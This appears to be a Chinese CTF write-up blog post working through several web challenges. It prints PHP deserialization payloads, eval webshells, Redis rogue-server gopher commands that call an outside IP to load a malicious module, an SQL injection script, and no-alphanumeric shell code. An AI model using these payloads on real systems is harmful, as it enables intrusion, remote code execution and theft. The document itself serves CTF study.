@@ -1,0 +1,1376 @@
+---
+title: 'Web经典题目复现' # (Required, max 60)
+description: '记录一下最近做过的题' # (Required, 10 to 160)
+publishDate: '2024-5-2' # (Required, Date)
+tags:
+  - Web
+heroImage: { src: 'https://image777.oss-cn-beijing.aliyuncs.com/img/202510062334314.jpg', inferSize: true, color: '#09e0f3ff' }
+draft: false # (set true will only show in development)
+language: '简中' # (String as you like)
+comment: true # (set false will disable comment, even if you've enabled it in site-config)
+---
+import { Aside, Tabs, TabItem, MdxRepl } from 'astro-pure/user'
+
+## [天翼杯 2021]esay_eval
+
+**考点**：`PHP反序列化`、`Redis主从复制`
+
+```php
+<?php
+class A{
+    public $code = "";
+    function __call($method,$args){
+        eval($this->code);
+        
+    }
+    function __wakeup(){
+        $this->code = "";
+    }
+}
+
+class B{
+    function __destruct(){
+        echo $this->a->a();
+    }
+}
+if(isset($_REQUEST['poc'])){
+    preg_match_all('/"[BA]":(.*?):/s',$_REQUEST['poc'],$ret);
+    if (isset($ret[1])) {
+        foreach ($ret[1] as $i) {
+            if(intval($i)!==1){
+                exit("you want to bypass wakeup ? no !");
+            }
+        }
+        unserialize($_REQUEST['poc']);    
+    }
+
+
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+分析之后，我们有这样的思路：创建一个B类`$b`，然后b中有一个名为a的方法，而a是A类。当反序列化时，会执行B类的`__destruct`函数，执行`echo $this->a->a();`，因为A类不存在a方法，所以会执行`__call()`函数，从而执行`eval()函数`
+
+现在题中还有两个阻碍，一个类A中的`__wakeup`方法会将`code`的值置空，程序调用反序列化方法时，会自动执行`__weakup()`函数，利用php特性-当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 `__weakup();`，第二个阻碍对传入参数作正则匹配，，匹配A类和B类名字后面的数目，要求必须为1，而我们要绕过`wakeup`需要大于1，这里利用php对类名大小写不敏感的特性去绕过
+
+exp:
+
+```php
+<?php
+class a{
+    public $code = "phpinfo();";
+    function __call($method,$args){
+        eval($this->code);
+        
+    }
+    function __wakeup(){
+        $this->code = "";
+    }
+}
+
+class b{
+    function __destruct(){
+        echo $this->a->a();
+    }
+}
+
+$b = new b();
+$b->a = new a();
+echo serialize($b);
+
+# O:1:"b":1:{s:1:"a";O:1:"a":1:{s:4:"code";s:10:"phpinfo();";}}
+```
+
+将b后成员列表个数修改后可得payload`?poc=O:1:"b":2:{s:1:"a";O:1:"a":1:{s:4:"code";s:10:"phpinfo();";}}`
+
+![160391bdfe7f5018aa7ae7ccf585cd6a](https://s2.loli.net/2024/05/01/1WOdkU8JeixwaQp.png)
+
+执行成功，发现`disable_functions`有过滤，无法直接RCE，利用`fputs`写入一句话木马
+
+```php
+<?php
+class a{
+    public $code = "fputs(fopen('dotast.php','w'),base64_decode(\"PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ
+10pOw==\"));";
+    function __call($method,$args){
+        eval($this->code);
+        
+    }
+    function __wakeup(){
+        $this->code = "";
+    }
+}
+
+class b{
+    function __destruct(){
+        echo $this->a->a();
+    }
+}
+
+$b = new b();
+$b->a = new a();
+echo serialize($b);
+
+# <?php @eval($_POST['pass']);
+# O:1:"b":2:{s:1:"a";O:1:"a":1:{s:4:"code";s:90:"fputs(fopen('dotast.php','w'),base64_decode("PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOw=="));";}}
+```
+
+或
+
+```php
+<?php
+
+class A{
+    public $code = "eval(\$_POST[1]);";
+    
+}
+
+class B{
+    public $a;
+    function __construct()
+    {
+        $this -> a=new A();
+    }
+}
+$c = new B();
+$poc = serialize($c);
+$payload = str_replace('A":1','a":2',$poc);
+echo '?poc='.$payload;
+# ?poc=O:1:"B":1:{s:1:"a";O:1:"a":2:{s:4:"code";s:16:"eval($_POST[1]);";}}
+```
+
+蚁剑连接，发现`.swp`文件为vim泄露，将其下载后改为`.config.php.swp`后恢复即可
+
+![343107e0c583fc38a9459f7e69eca23e](https://s2.loli.net/2024/05/01/oMR1FUEqI9hJ4kx.png)
+
+无文件读取权限但又上传权限，在`/var/www/html`目录上传`exp.so`文件利用Redis主从复制漏洞RCE
+
+`MODULE LOAD /var/www/html/exp.so`
+
+`system.exec "cat /f*"`
+
+**其他姿势**：发现`disable_functions`后可用蚁剑插件打穿
+
+![ee689f755b6726608ce3f59904918058](https://s2.loli.net/2024/05/02/9uyCbjT5M8VFOiz.png)
+
+## [网鼎杯 2020 玄武组]SSRFMe
+
+[参考WP](https://blog.csdn.net/m0_73512445/article/details/134740916)
+
+**考点**：`SSRF`、`Redis主从复制`
+
+```php
+<?php
+function check_inner_ip($url)
+{
+    $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);
+    if (!$match_result)
+    {
+        die('url fomat error');
+    }
+    try
+    {
+        $url_parse=parse_url($url);
+    }
+    catch(Exception $e)
+    {
+        die('url fomat error');
+        return false;
+    }
+    $hostname=$url_parse['host'];
+    $ip=gethostbyname($hostname);
+    $int_ip=ip2long($ip);
+    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;
+}
+
+function safe_request_url($url)
+{
+
+    if (check_inner_ip($url))
+    {
+        echo $url.' is inner ip';
+    }
+    else
+    {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        $output = curl_exec($ch);
+        $result_info = curl_getinfo($ch);
+        if ($result_info['redirect_url'])
+        {
+            safe_request_url($result_info['redirect_url']);
+        }
+        curl_close($ch);
+        var_dump($output);
+    }
+
+}
+if(isset($_GET['url'])){
+    $url = $_GET['url'];
+    if(!empty($url)){
+        safe_request_url($url);
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+// Please visit hint.php locally.
+?>
+```
+
+存在一个`curl`的ssrf，但是存在`check_inner_ip`的限制
+
+`check_inner_ip`做了几件事：限制协议只能为http,https,gopher,dict、使用`parse_url`获取host、使用` gethostbyname`获取ip地址(防御了xip.io这类利用dns解析的绕过方法)、使用`ip2long`将ip地址转为整数，判断是否为内网网段(防御了`127.0.0.1/8`)
+
+另外在发送请求后还对重定向的情况做了处理，获取请求信息，检查是否有重定向 URL。如果有，递归调用 `safe_request_url` 以处理重定向。
+```php
+if ($result_info['redirect_url'])
+{
+    safe_request_url($result_info['redirect_url']);
+}
+```
+这样基于跳转的方法也无法使用了
+
+[一些SSRF绕过技巧](https://liotree.github.io/2020/07/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/#ssrf)
+
+这里给出两种姿势`http://0.0.0.0/hint.php`、`http://[0:0:0:0:0:ffff:127.0.0.1]/hint.php`
+
+hint.php
+
+```php
+if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){
+    highlight_file(__FILE__);
+}
+if(isset($_POST['file'])){
+    file_put_contents($_POST['file'],"<?php echo 'redispass is root';exit();".$_POST['file']);
+} "
+```
+
+绕过写`shell`没有权限，不过给了Redis的密码`root`，可以打主从复制RCE
+
+准备过程：将redis-rogue-server的exp.so文件复制到`Awsome-Redis-Rogue-Server`中，使用`Awsome-Redis-Rogue-Server`工具开启主服务，并且恶意so文件指定为exp.so，因为exp.so里面有system模块
+
+开启主服务`python3 redis_rogue_server.py -v -path exp.so -lport 9000`
+
+然后就是gopher协议联动redies
+
+```shell
+gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit
+
+#上述payload的解码结果
+gopher://0.0.0.0:6379/_auth root
+config set dir /tmp/
+quit
+
+```
+
+```shell
+gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%252039.106.249.221%25209000%250d%250aquit
+
+#上述payload的解码结果
+gopher://0.0.0.0:6379/_auth root
+config set dbfilename exp.so
+slaveof 39.106.249.221 9000
+quit
+
+```
+
+```shell
+gopher://0.0.0.0:6379/_auth%2520root%250d%250amodule%2520load%2520./exp.so%250d%250aquit
+
+#上述payload的解码结果
+gopher://0.0.0.0:6379/_auth root
+module load ./exp.so
+quit
+```
+
+```shell
+gopher://0.0.0.0:6379/_auth%2520root%250d%250asystem.exec%2520%2522cat%2520%252Fflag%2522%250d%250aquit
+
+#上述payload的解码结果
+gopher://0.0.0.0:6379/_auth root
+system.exec "cat /flag"
+quit
+```
+
+若靶机可出网也可采用反弹Shell方式
+
+## [网鼎杯 2018]unfinish
+
+**考点**：`SQL二次注入`
+
+打开题目发现`/login.php`没有注入点，猜错或扫描可得到`register.php`，注册测试账号后自动跳转回登陆界面，登陆成功后`<span class="user-name">test1</span> `用户名直接回显，猜测注册用户名处存在二次注入
+
+用BP `FUZZ`一下发现过滤了`,`、`information_schema.tables`、`%0a`等
+
+绕过方法：mysql中，+只能当做运算符，字母部分会被截断，与数字部分相加
+
+![b8d8dfb709d277bd24afbf60e913de63](https://s2.loli.net/2024/05/03/dPwGQ6CXqRinxcW.png)
+
+由此可以逐位获得库名的`ascii`值，但因为过滤了`,`，我们用`from for`代替，类似 `substr(str from 1 for 10)`（表示截取str字符串的从第1个开始的10个字符），得到数据库名为`web`，由于过滤了`information_schema.tables`，得不到表名，根据网上的WP，只能猜表名为`flag`，写脚本即可
+
+```python
+import requests
+import logging
+import re
+from time import sleep
+
+def search():
+    flag = ''
+    url = 'http://node4.anna.nssctf.cn:28710/' # 修改为靶机URL
+    url1 = url+'register.php'
+    url2 = url+'login.php'
+    for i in range(100):
+        sleep(0.3)
+        data1 = {"email" : "1234{}@123.com".format(i), "username" : "0'+ascii(substr((select * from flag) from {} for 1))+'0;".format(i), "password" : "123"}
+        data2 = {"email" : "1234{}@123.com".format(i), "password" : "123"}
+        r1 = requests.post(url1, data=data1)
+        r2 = requests.post(url2, data=data2)
+        res = re.search(r'<span class="user-name">\s*(\d*)\s*</span>',r2.text)
+        res1 = re.search(r'\d+', res.group())
+        flag = flag+chr(int(res1.group()))
+        print(flag)
+    print("final:"+flag)
+
+if __name__ == '__main__':
+    search()
+# NSSCTF{515d99e2-bd44-4048-8797-26c9c5e57e45}
+```
+
+## [TQLCTF 2022]simple_bypass
+
+**考点**：`代码审计`、`无数字字母RCE`
+
+RCE部分参考P牛的文章[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
+
+题目打开正常注册，登录寻找利用点，查看源代码搜索`php`发现
+
+![1f67021bf1a49aea94ae792f1fcbcea4](https://s2.loli.net/2024/05/04/VO6TmEaeL1iCb3y.png)
+
+利用`../get_pic.php?image=img/haokangde.png`获取图片内容，猜测有任意文件读取漏洞，尝试路径穿越读`flag`失败，我们尝试读取一下登录界面源码
+
+`/get_pic.php?image=index.php`拿到`index.php`源码
+
+```php
+<?php
+error_reporting(0);
+if(isset($_POST['user']) && isset($_POST['pass'])){
+	$hash_user = md5($_POST['user']);
+	$hash_pass = 'zsf'.md5($_POST['pass']);
+	if(isset($_POST['punctuation'])){
+		//filter
+		if (strlen($_POST['user']) > 6){
+			echo("<script>alert('Username is too long!');</script>");
+		}
+		elseif(strlen($_POST['website']) > 25){
+			echo("<script>alert('Website is too long!');</script>");
+		}
+		elseif(strlen($_POST['punctuation']) > 1000){
+			echo("<script>alert('Punctuation is too long!');</script>");
+		}
+		else{
+			if(preg_match('/[^\w\/\(\)\*<>]/', $_POST['user']) === 0){
+				if (preg_match('/[^\w\/\*:\.\;\(\)\n<>]/', $_POST['website']) === 0){
+					$_POST['punctuation'] = preg_replace("/[a-z,A-Z,0-9>\?]/","",$_POST['punctuation']);
+					$template = file_get_contents('./template.html');
+					$content = str_replace("__USER__", $_POST['user'], $template);
+					$content = str_replace("__PASS__", $hash_pass, $content);
+					$content = str_replace("__WEBSITE__", $_POST['website'], $content);
+					$content = str_replace("__PUNC__", $_POST['punctuation'], $content);
+					file_put_contents('sandbox/'.$hash_user.'.php', $content);
+					echo("<script>alert('Successed!');</script>");
+				}
+				else{
+					echo("<script>alert('Invalid chars in website!');</script>");
+				}
+			}
+			else{
+				echo("<script>alert('Invalid chars in username!');</script>");
+			}
+		}
+	}
+	else{
+		setcookie("user", $_POST['user'], time()+3600);
+		setcookie("pass", $hash_pass, time()+3600);
+		Header("Location:sandbox/$hash_user.php");
+	}
+}
+?>
+```
+
+通过审计不难发现，该功能只是将输入的信息替换并插入模板文件`./template.html`中，因此我们再读取该文件
+
+```html
+		<?php
+			error_reporting(0);
+			$user = ((string)__USER__);
+			$pass = ((string)__PASS__);
+			
+			if(isset($_COOKIE['user']) && isset($_COOKIE['pass']) && $_COOKIE['user'] === $user && $_COOKIE['pass'] === $pass){
+				echo($_COOKIE['user']);
+			}
+			else{
+				die("<script>alert('Permission denied!');</script>");
+			}
+		?>
+		</li>
+      </ul>
+      <ul class="item">
+        <li><span class="sitting_btn"></span>系统设置</li>
+        <li><span class="help_btn"></span>使用指南 <b></b></li>
+        <li><span class="about_btn"></span>关于我们</li>
+        <li><span class="logout_btn"></span>退出系统</li>
+      </ul>
+    </div>
+  </div>
+</div>
+<a href="#" class="powered_by">__PUNC__</a>
+<ul id="deskIcon">
+  <li class="desktop_icon" id="win5" path="https://image.baidu.com/"> <span class="icon"><img src="../img/icon4.png"/></span>
+    <div class="text">图片
+      <div class="right_cron"></div>
+    </div>
+  </li>
+  <li class="desktop_icon" id="win6" path="http://www.4399.com/"> <span class="icon"><img src="../img/icon5.png"/></span>
+    <div class="text">游戏
+      <div class="right_cron"></div>
+    </div>
+  </li>
+  <li class="desktop_icon" id="win10" path="../get_pic.php?image=img/haokangde.png"> <span class="icon"><img src="../img/icon4.png"/></span>
+    <div class="text"><b>好康的</b>
+      <div class="right_cron"></div>
+    </div>
+  </li>
+  <li class="desktop_icon" id="win16" path="__WEBSITE__"> <span class="icon"><img src="../img/icon10.png"/></span>
+    <div class="text"><b>你的网站</b>
+```
+
+这里`$_POST['punctuation']`的长度限制为1000,其他的都很短，说明可能要利用这个点，原本想的是在`__PUNC__`的地方替换为`<script language=php>`来执行php语句，但是php7后就不再支持这样弄了，这里只有上面有`<?php`，所以我们要利用上面的那个`<?php`标志来执行语句
+
+回到`index.php`看一下过滤
+
+```php
+if(preg_match('/[^\w\/\(\)\*<>]/', $_POST['user']) === 0){
+				if (preg_match('/[^\w\/\*:\.\;\(\)\n<>]/', $_POST['website']) === 0){
+					$_POST['punctuation'] = preg_replace("/[a-z,A-Z,0-9>\?]/","",$_POST['punctuation']);
+```
+
+<Aside type='tip'>
+tips：不确定正则过滤后的可用可见字符时，可写脚本判断
+
+```php
+<?php
+//自增rce
+$pass='';
+for($i=32;$i<127;$i++){
+    if (!preg_match("/[!@#%^&*:'\-<?>\"\/|`a-zA-Z~\\\\]/", chr($i))) {
+        $pass = $pass.chr($i);
+    }
+}
+echo "当前能过waf的字符：".$pass."\n";
+#当前能过waf的字符： $()+,.0123456789;=[]_{}
+```
+</Aside>
+
+其含义为`user`必须以指定符号开头，`website`相似，`punctuation`不能包含数字字母以及`>`、`?`
+
+由于index.php文件是对`__USER__`等字符串进行的替换，所以我们可以使用多行注释，将下面的内容都注释掉
+然后在`__PUNC__`的地方进行闭合，这样就能继续利用上面的php标志来执行php语句了
+
+```php
+# 示例
+$a=((string)/*);
+    asdasd
+asdasda
+asdasdasd
+asdasd8*/[]);echo '123';
+```
+
+由于过滤了数字字母以及`>`、`?`，所以要使用无字母shell，利用自增和异或均可
+
+```php
+$_=''.[];//获得字符串Array
+$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
+//ASSERT[$_POST[_]]
+```
+
+异或
+
+```php
+$_='($((%-'^'[][\@@';$__='#:%('^'|}`|';$___='$'.$__;echo $___;$_($___['1']);
+# system($_GET['1']);
+```
+
+源代码中`$user = ((string)__USER__);`，`(string)`后面必须要有内容，否则会报错
+
+用如下payload：`$_POST['punctuation']=*/[]);$_=''.[];$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);`
+
+报错是因为后面的`html`标签解析错误，用注释符`/*`注释掉即可，所以会爆warn（因为注释符没闭合）,但是warn不会影响代码执行
+
+```shell
+USERNAME:
+/*
+PASSWORD:
+(any)
+YOURWEBSIT:
+(any)
+YOURPUNCTUATION:
+*/[]);$_=''.[];$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);/*
+```
+
+`POST: _=file_put_contents('shell.php','<?php eval($_POST[1]);?>');`
+
+蚁剑连接读取`flag`即可
+
+## [CISCN 2019华北Day1]Web1
+
+**考点**：`phar反序列化`
+
+原理、影响函数及利用条件参考[这篇](https://blog.csdn.net/unexpectedthing/article/details/122930867)
+
+进入题目正常注册登录，随便上传一个文件，发现还有删除和下载两个功能点，利用下载读取源码
+
+> 这里用绝对路径，也可以用相对路径`../../index.php`，之所以用两个`../`在知道源码的情况下是因为在执行`download.php`时会进入`uploads/sandbox/`文件夹
+
+按照已发现的功能获取以下文件源码`delete.php` `index.php` `register.php` `login.php` `upload.php` `class.php`
+
+### `class.php`
+
+```php
+<?php
+error_reporting(0);
+$dbaddr = "127.0.0.1";
+$dbuser = "root";
+$dbpass = "root";
+$dbname = "dropbox";
+$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);
+
+class User {
+    public $db;
+
+    public function __construct() {
+        global $db;
+        $this->db = $db;
+    }
+
+    public function user_exist($username) {
+        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
+        $stmt->bind_param("s", $username);
+        $stmt->execute();
+        $stmt->store_result();
+        $count = $stmt->num_rows;
+        if ($count === 0) {
+            return false;
+        }
+        return true;
+    }
+
+    public function add_user($username, $password) {
+        if ($this->user_exist($username)) {
+            return false;
+        }
+        $password = sha1($password . "SiAchGHmFx");
+        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
+        $stmt->bind_param("ss", $username, $password);
+        $stmt->execute();
+        return true;
+    }
+
+    public function verify_user($username, $password) {
+        if (!$this->user_exist($username)) {
+            return false;
+        }
+        $password = sha1($password . "SiAchGHmFx");
+        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
+        $stmt->bind_param("s", $username);
+        $stmt->execute();
+        $stmt->bind_result($expect);
+        $stmt->fetch();
+        if (isset($expect) && $expect === $password) {
+            return true;
+        }
+        return false;
+    }
+
+    public function __destruct() {
+        $this->db->close();
+    }
+}
+
+class FileList {
+    private $files;
+    private $results;
+    private $funcs;
+
+    public function __construct($path) {
+        $this->files = array();
+        $this->results = array();
+        $this->funcs = array();
+        $filenames = scandir($path);
+        //删除 ..和. 防止目录遍历
+        $key = array_search(".", $filenames); 
+        unset($filenames[$key]);
+        $key = array_search("..", $filenames); 
+        unset($filenames[$key]);
+
+        foreach ($filenames as $filename) {
+            $file = new File();
+            $file->open($path . $filename);
+            array_push($this->files, $file);
+            $this->results[$file->name()] = array();
+        }
+    }
+
+    public function __call($func, $args) {
+        array_push($this->funcs, $func);
+        foreach ($this->files as $file) {
+            $this->results[$file->name()][$func] = $file->$func();
+        }
+    }
+
+    public function __destruct() {
+        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
+        $table .= '<thead><tr>';
+        foreach ($this->funcs as $func) {
+            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
+        }
+        $table .= '<th scope="col" class="text-center">Opt</th>';
+        $table .= '</thead><tbody>';
+        foreach ($this->results as $filename => $result) {
+            $table .= '<tr>';
+            foreach ($result as $func => $value) {
+                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
+            }
+            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
+            $table .= '</tr>';
+        }
+        echo $table;
+    }
+}
+
+class File {
+    public $filename;
+
+    public function open($filename) {
+        $this->filename = $filename;
+        if (file_exists($filename) && !is_dir($filename)) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    public function name() {
+        return basename($this->filename);
+    }
+
+    public function size() {
+        $size = filesize($this->filename);
+        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
+        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
+        return round($size, 2).$units[$i];
+    }
+
+    public function detele() {
+        unlink($this->filename);
+    }
+
+    public function close() {
+        return file_get_contents($this->filename);
+    }
+}
+?>
+```
+
+### `delete.php`
+
+```php
+<?php
+session_start();
+if (!isset($_SESSION['login'])) {
+    header("Location: login.php");
+    die();
+}
+
+if (!isset($_POST['filename'])) {
+    die();
+}
+
+include "class.php";
+
+chdir($_SESSION['sandbox']);
+$file = new File();
+$filename = (string) $_POST['filename'];
+if (strlen($filename) < 40 && $file->open($filename)) {
+    $file->detele();
+    Header("Content-type: application/json");
+    $response = array("success" => true, "error" => "");
+    echo json_encode($response);
+} else {
+    Header("Content-type: application/json");
+    $response = array("success" => false, "error" => "File not exist");
+    echo json_encode($response);
+}
+?>
+```
+
+### `download.php`
+
+```php
+<?php
+session_start();
+if (!isset($_SESSION['login'])) {
+    header("Location: login.php");
+    die();
+}
+
+if (!isset($_POST['filename'])) {
+    die();
+}
+
+include "class.php";
+ini_set("open_basedir", getcwd() . ":/etc:/tmp");//只有网站目录和/etc /tmp可以操作
+
+chdir($_SESSION['sandbox']);
+$file = new File();
+$filename = (string) $_POST['filename'];
+if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
+    Header("Content-type: application/octet-stream");
+    Header("Content-Disposition: attachment; filename=" . basename($filename));
+    echo $file->close();
+} else {
+    echo "File not exist";
+}
+?>
+```
+
+### `upload.php`
+
+```php
+<?php
+session_start();
+if (!isset($_SESSION['login'])) {
+    header("Location: login.php");
+    die();
+}
+
+include "class.php";
+
+if (isset($_FILES["file"])) {
+    $filename = $_FILES["file"]["name"];
+    $pos = strrpos($filename, ".");
+    if ($pos !== false) {
+        $filename = substr($filename, 0, $pos);
+    }
+    
+    $fileext = ".gif";
+    switch ($_FILES["file"]["type"]) {
+        case 'image/gif':
+            $fileext = ".gif";
+            break;
+        case 'image/jpeg':
+            $fileext = ".jpg";
+            break;
+        case 'image/png':
+            $fileext = ".png";
+            break;
+        default:
+            $response = array("success" => false, "error" => "Only gif/jpg/png allowed");
+            Header("Content-type: application/json");
+            echo json_encode($response);
+            die();
+    }
+
+    if (strlen($filename) < 40 && strlen($filename) !== 0) {
+        $dst = $_SESSION['sandbox'] . $filename . $fileext;
+        move_uploaded_file($_FILES["file"]["tmp_name"], $dst);
+        $response = array("success" => true, "error" => "");
+        Header("Content-type: application/json");
+        echo json_encode($response);
+    } else {
+        $response = array("success" => false, "error" => "Invaild filename");
+        Header("Content-type: application/json");
+        echo json_encode($response);
+    }
+}
+?>
+```
+
+### `register.php`
+
+```php
+<?php
+session_start();
+if (isset($_SESSION['login'])) {
+    header("Location: index.php");
+    die();
+}
+?>
+    ......(html css)
+<?php
+include "class.php";
+
+if (isset($_POST["username"]) && isset($_POST["password"])) {
+    $u = new User();
+    $username = (string) $_POST["username"];
+    $password = (string) $_POST["password"];
+    if (strlen($username) < 20 && strlen($username) > 2 && strlen($password) > 1) {
+        if ($u->add_user($username, $password)) {
+            echo("<script>window.location.href='login.php?register';</script>");
+            die();
+        } else {
+            echo "<script>toast('此用户名已被使用', 'warning');</script>";
+            die();
+        }
+    }
+    echo "<script>toast('请输入有效用户名和密码', 'warning');</script>";
+}
+?>
+```
+
+### `index.php`
+
+```php
+<?php
+session_start();
+if (!isset($_SESSION['login'])) {
+    header("Location: login.php");
+    die();
+}
+?>
+    ...(html css)
+<?php
+include "class.php";
+
+$a = new FileList($_SESSION['sandbox']);
+$a->Name();
+$a->Size();
+?>
+```
+
+### `login.php`
+
+```php
+<?php
+session_start();
+if (isset($_SESSION['login'])) {
+    header("Location: index.php");
+    die();
+}
+?>
+
+    ...(html css)
+<?php
+include "class.php";
+
+if (isset($_GET['register'])) {
+    echo "<script>toast('注册成功', 'info');</script>";
+}
+
+if (isset($_POST["username"]) && isset($_POST["password"])) {
+    $u = new User();
+    $username = (string) $_POST["username"];
+    $password = (string) $_POST["password"];
+    if (strlen($username) < 20 && $u->verify_user($username, $password)) {
+        $_SESSION['login'] = true;
+        $_SESSION['username'] = htmlentities($username);
+        $sandbox = "uploads/" . sha1($_SESSION['username'] . "sftUahRiTz") . "/";
+        if (!is_dir($sandbox)) {
+            mkdir($sandbox);
+        }
+        $_SESSION['sandbox'] = $sandbox;
+        echo("<script>window.location.href='index.php';</script>");
+        die();
+    }
+    echo "<script>toast('账号或密码错误', 'warning');</script>";
+}
+?>
+```
+
+给了`class.php`基本上确定是一道反序列化问题，找入口点
+
+在`User`类中
+
+```php
+class User {
+    public $db;
+
+    public function __construct() {
+        global $db;
+        $this->db = $db;
+    }
+}
+```
+
+这里的global是引进全局变量，而这个`$db`是`class.php`里的变量
+
+```php
+$dbaddr = "127.0.0.1";
+$dbuser = "root";
+$dbpass = "root";
+$dbname = "dropbox";
+$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);
+```
+
+所以在User类的
+
+```php
+public function __destruct() {
+    $this->db->close();
+}
+```
+
+close()调用的是`mysqli::close`，但是在`File`类中也有个`close()`
+
+```php
+public function close() {
+    return file_get_contents($this->filename);
+}
+```
+
+看到这里意识到链子最终应该是`close()`进行文件内容的读取，而调用`close()`的地方只有一个，那就是User的`__destruct()`方法，控制`$db`为file对象即可，但此时我们读取文件内容但无法回显，再看`FileList`类有可疑的`__call`魔术方法
+
+```php
+public function __call($func, $args) {
+    array_push($this->funcs, $func);
+    foreach ($this->files as $file) {
+        $this->results[$file->name()][$func] = $file->$func();
+    }
+}
+```
+
+如果调用`close()`的话,就是先将方法名存储`$this->funcs`数组里
+然后依次调用`$this->files`数组里的元素的close()方法，然后存储在`$this->results[$file->name()][$func]`
